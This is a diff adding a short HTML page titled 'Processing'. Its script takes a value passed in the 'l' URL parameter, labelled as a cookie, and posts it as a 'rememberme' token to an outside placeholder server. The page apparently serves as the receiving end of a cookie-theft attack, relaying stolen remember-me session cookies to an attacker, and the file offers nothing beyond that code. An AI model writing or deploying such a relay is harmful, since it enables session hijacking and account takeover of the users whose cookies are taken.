@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Processing</title>
+    <script>
+        // Extract the 'l' query parameter from the URL
+        const params = new URLSearchParams(location.search);
+        const cookieValue = params.get('l');
+
+        if (cookieValue) {
+            // Example: Send the cookie value to a server for processing
+            fetch('https://your-server-endpoint.com/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ rememberme: cookieValue })
+            });
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
